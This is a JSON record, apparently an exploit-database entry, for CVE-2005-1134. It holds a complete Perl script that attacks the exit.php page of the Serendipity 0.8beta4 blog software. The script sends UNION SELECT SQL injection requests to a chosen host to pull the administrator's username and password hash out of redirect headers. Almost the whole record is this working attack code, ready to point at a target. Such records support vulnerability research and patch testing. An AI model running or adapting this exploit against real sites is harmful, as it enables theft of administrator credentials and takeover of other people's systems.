{
  "id": "939",
  "title": "S9Y Serendipity 0.8beta4 - &#039;exit.php&#039; SQL Injection",
  "cve": "CVE-2005-1134",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n# Serendipity 0.8beta4 exit.php SQL Injection exploit\r\n# (c) ADZ Security Team 2004-2005\r\n# (c) kreon 2005\r\n# http://adz.void.ru/\r\n# kre0n@mail.ru\r\n# Public :)\r\n\r\nprint \"\\n\\n\";\r\nprint \"# Serendipity 0.8beta4 exit.php SQL Injection exploit\\n\";\r\nprint \"# (C) ADZ Security Team 2004-2005\\n\";\r\nprint \"# (C) kreon 2005\\n\";\r\n\r\nuse IO::Socket;\r\nuse Getopt::Std;\r\n\r\ngetopt(\"h:d:p:t:\");\r\n\r\n$opt_p ||= 80;\r\n$opt_d ||= \"/\";\r\n$opt_t ||= \"serendipity_\";\r\n\r\nif(!$opt_h) {\r\n    die(\"# Usage: $0 -h <host> [-d <dir>] [-p <port>] [-t table_prefix]\\n\");\r\n}\r\n\r\n$sqlpass = \"?entry_id=1&url_id=1%20UNION%20SELECT%20password%20FROM%20\".$opt_t.\"authors%20WHERE%20userlevel=255/*\";\r\n$sqllogin = \"?entry_id=1&url_id=1%20UNION%20SELECT%20username%20FROM%20\".$opt_t.\"authors%20WHERE%20userlevel=255/*\";\r\n\r\nprint \"# Host: $opt_h\\n\";\r\nprint \"# Dir: $opt_d\\n\";\r\nprint \"# Port: $opt_p\\n\";\r\nprint \"# Prefix: $opt_t\\n\";\r\n\r\n$Q1 = \"GET \".$opt_d.\"/exit.php\".$sqllogin.\" HTTP/1.0\\n\";\r\n$Q1 .= \"Host: \".$opt_h.\"\\n\\n\";\r\n\r\n$Q2 = \"GET \".$opt_d.\"/exit.php\".$sqlpass.\" HTTP/1.0\\n\";\r\n$Q2 .= \"Host: \".$opt_h.\"\\n\\n\";\r\n\r\n$s = IO::Socket::INET->new(Proto => 'tcp', PeerAddr => $opt_h, PeerPort => $opt_p) or die(\"Can't connect!\");\r\n$s->send($Q1);\r\n$s->recv($txt, 1024);\r\nif($txt =~ m/location: (\\S+)/i) {\r\n    $login =  $1;\r\n}\r\n\r\n$s = IO::Socket::INET->new(Proto=>'tcp', PeerAddr => $opt_h, PeerPort => $opt_p) or die(\"Can't connect!\");\r\n$s->send($Q2);\r\n$s->recv($txt, 1024);\r\nif($txt =~ m/location: (\\S+)/i) {\r\n    $pass = $1;\r\n}\r\nif(!$login || !$pass || $login =~ m/http:\\/\\//i || $pass =~ m/http:\\/\\//i) {\r\n    print \"# Failed :(\\n\";\r\n    exit;\r\n}\r\n\r\nprint \"# Succeed :)\\n\";\r\nprint \"# Login: $login\\n\";\r\nprint \"# Pass Hash: $pass\\n\";\r\nprint \"\\n\";\r\n\r\n# milw0rm.com [2005-04-13]",
  "url": "https://www.exploit-db.com/exploits/939"
}